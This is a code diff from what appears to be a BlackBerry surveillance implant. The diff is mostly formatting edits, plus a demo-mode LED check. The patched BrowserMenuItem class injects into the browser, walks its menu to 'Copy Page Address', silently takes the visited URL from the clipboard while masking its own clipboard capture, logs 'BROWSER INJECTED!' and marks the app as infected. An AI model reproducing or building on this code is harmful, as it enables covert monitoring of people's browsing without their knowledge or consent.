@@ -15,6 +15,7 @@ import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.Device;
+import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
@@ -69,12 +70,13 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#endif
 
             if (Device.getInstance().atLeast(6, 0)) {
-                ((ModuleClipboard)ModuleClipboard.getInstance()).suspendClip();
+                ((ModuleClipboard) ModuleClipboard.getInstance()).suspendClip();
                 boolean ret = MenuWalker.walk("Copy Page Address");
                 if (ret) {
-                    
+
                     String url = (String) Clipboard.getClipboard().get();
-                    ((ModuleClipboard)ModuleClipboard.getInstance()).setClip(url);
+                    ((ModuleClipboard) ModuleClipboard.getInstance())
+                            .setClip(url);
                     if (url != null) {
                         //#ifdef DEBUG
                         debug.trace("run, 6.0, URL FOUND:" + url);
@@ -85,10 +87,11 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                     //#ifdef DEBUG
                     debug.error("run: no Copy Address, wrong screen");
                     //#endif
-                    ((ModuleClipboard)ModuleClipboard.getInstance()).resumeClip();
+                    ((ModuleClipboard) ModuleClipboard.getInstance())
+                            .resumeClip();
                     return null;
                 }
-                ((ModuleClipboard)ModuleClipboard.getInstance()).resumeClip();
+                ((ModuleClipboard) ModuleClipboard.getInstance()).resumeClip();
             }
 
             if (browserScreen == null) {
@@ -106,9 +109,9 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 debug.info("BROWSER INJECTED!");
                 //#endif
 
-                //#ifdef DEMO
-                Debug.ledFlash(Debug.COLOR_GREEN);
-                //#endif
+                if (Status.self().isDemo()) {
+                    Debug.ledFlash(Debug.COLOR_GREEN);
+                }
 
                 AppInjectorBrowser.getInstance().setInfected(true);
             }
